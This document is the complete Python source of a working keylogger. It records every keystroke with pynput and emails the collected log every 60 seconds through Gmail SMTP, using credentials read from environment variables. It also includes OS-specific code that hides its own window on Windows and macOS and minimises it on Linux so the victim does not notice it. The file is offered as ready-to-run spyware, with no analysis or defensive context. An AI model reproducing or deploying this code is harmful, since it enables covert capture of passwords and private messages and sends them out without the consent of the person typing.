import os
import smtplib
import threading
import sys
from pynput import keyboard
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import platform

EMAIL_ADDRESS = os.getenv("EMAIL_ADDRESS")
EMAIL_PASSWORD = os.getenv("EMAIL_PASSWORD")
SEND_REPORT_EVERY = 60  # seconds

class KeyLogger:
    def __init__(self, email, password):
        self.log = ""
        self.email = email
        self.password = password
        self.stop_event = threading.Event()

    def append_log(self, string):
        self.log += string

    def on_press(self, key):
        try:
            current_key = key.char
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.esc:
                current_key = "ESC"
            else:
                current_key = f" [{str(key)}] "
        self.append_log(current_key)

    def send_mail(self, message):
        msg = MIMEMultipart()
        msg['From'] = self.email
        msg['To'] = self.email
        msg['Subject'] = "Keylogger Report"
        msg.attach(MIMEText(message, 'plain'))

        try:
            with smtplib.SMTP("smtp.gmail.com", 587) as server:
                server.starttls()
                server.login(self.email, self.password)
                server.sendmail(self.email, self.email, msg.as_string())
        except Exception as e:
            print(f"Failed to send email: {e}")

    def report(self):
        while not self.stop_event.is_set():
            if self.log:
                self.send_mail(self.log)
                self.log = ""
            self.stop_event.wait(SEND_REPORT_EVERY)

    def start_listener(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

    def start(self):
        threading.Thread(target=self.report, daemon=True).start()
        listener_thread = threading.Thread(target=self.start_listener)
        listener_thread.daemon = True
        listener_thread.start()
        listener_thread.join()

    def stop(self):
        self.stop_event.set()

# OS-specific hiding logic
if platform.system() == "Windows":
    import win32gui
    import win32con

    def hide_program():
        the_program_to_hide = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(the_program_to_hide, win32con.SW_HIDE)

elif platform.system() == "Darwin":  # macOS
    def hide_program():
        os.system("osascript -e 'tell application \"System Events\" to set visible of process \"Terminal\" to false'")


elif platform.system() == "Linux":  # Linux
    def hide_program():
        os.system("xdotool getactivewindow windowminimize")
else:
    def hide_program():
        print("OS not supported for hiding program.")

if __name__ == "__main__":
    try:
        keylogger = KeyLogger(EMAIL_ADDRESS, EMAIL_PASSWORD)
        keylogger_thread = threading.Thread(target=keylogger.start)
        keylogger_thread.daemon = True
        keylogger_thread.start()

        hide_program()

        while True:
            pass  # Keep the main thread alive
    except KeyboardInterrupt:
        keylogger.stop()
        print("Keylogger terminated.")
        sys.exit(0)
